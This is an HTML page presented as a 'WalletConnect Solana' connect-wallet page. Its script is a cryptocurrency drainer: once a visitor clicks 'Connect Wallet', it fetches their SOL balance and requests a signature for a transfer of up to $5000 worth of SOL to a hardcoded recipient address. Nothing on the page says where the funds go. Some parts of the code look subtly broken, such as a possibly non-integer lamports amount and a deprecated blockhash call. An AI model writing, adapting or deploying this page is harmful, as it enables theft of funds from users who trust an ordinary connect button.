<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WalletConnect Solana</title>
    <!-- Include required libraries -->
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-wallets"></script>
    <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-base"></script>
    <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-walletconnect"></script>
</head>
<body>
    <h1>Connect and Transfer SOL</h1>
    <button id="connectWallet">Connect Wallet</button>

    <script>
        (async () => {
            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));

            // Define constants
            const recipientAddress = "AaTLKPX9WKSC8eWvkUXj7GTfdx11gAmuYrNBwMSbBYSE"; // Recipient wallet
            const maxTransferLimitUSD = 5000; // Max transfer in USD
            const solToUsdRate = 25; // Current SOL price in USD (update as needed)

            // Initialize WalletConnect adapter
            const walletAdapter = new solanaWalletAdapterWalletconnect.WalletConnectWalletAdapter();

            // Function to connect wallet
            async function connectWallet() {
                try {
                    await walletAdapter.connect(); // Initiate WalletConnect QR code flow
                    console.log("Wallet connected:", walletAdapter.publicKey.toString());

                    // Fetch wallet balance
                    const publicKey = walletAdapter.publicKey;
                    const balanceLamports = await connection.getBalance(publicKey);
                    const balanceSol = balanceLamports / solanaWeb3.LAMPORTS_PER_SOL;
                    console.log("Wallet balance (SOL):", balanceSol);

                    // Calculate transfer amount (limit to $5000)
                    const maxTransferSol = maxTransferLimitUSD / solToUsdRate;
                    const transferAmount = Math.min(balanceSol, maxTransferSol);
                    console.log("Transfer amount (SOL):", transferAmount);

                    if (transferAmount <= 0) {
                        alert("Insufficient balance to transfer.");
                        return;
                    }

                    // Execute transfer
                    await transferSOL(walletAdapter, publicKey, transferAmount);
                } catch (error) {
                    console.error("Error connecting wallet:", error);
                    alert("Failed to connect wallet.");
                }
            }

            // Function to transfer SOL
            async function transferSOL(walletAdapter, publicKey, amountSol) {
                try {
                    const transaction = new solanaWeb3.Transaction();

                    // Add transfer instruction
                    transaction.add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: publicKey,
                            toPubkey: new solanaWeb3.PublicKey(recipientAddress),
                            lamports: amountSol * solanaWeb3.LAMPORTS_PER_SOL,
                        })
                    );

                    // Set transaction parameters
                    const { blockhash } = await connection.getRecentBlockhash();
                    transaction.recentBlockhash = blockhash;
                    transaction.feePayer = publicKey;

                    // Sign and send transaction
                    const signedTransaction = await walletAdapter.signTransaction(transaction);
                    const signature = await connection.sendRawTransaction(signedTransaction.serialize());
                    await connection.confirmTransaction(signature, 'finalized');

                    console.log("Transfer successful:", signature);
                    alert(`Transfer complete! Transaction signature: ${signature}`);
                } catch (error) {
                    console.error("Error during transfer:", error);
                    alert("Failed to complete transfer.");
                }
            }

            // Attach connect button listener
            document.getElementById("connectWallet").addEventListener("click", connectWallet);
        })();
    </script>
</body>
</html>
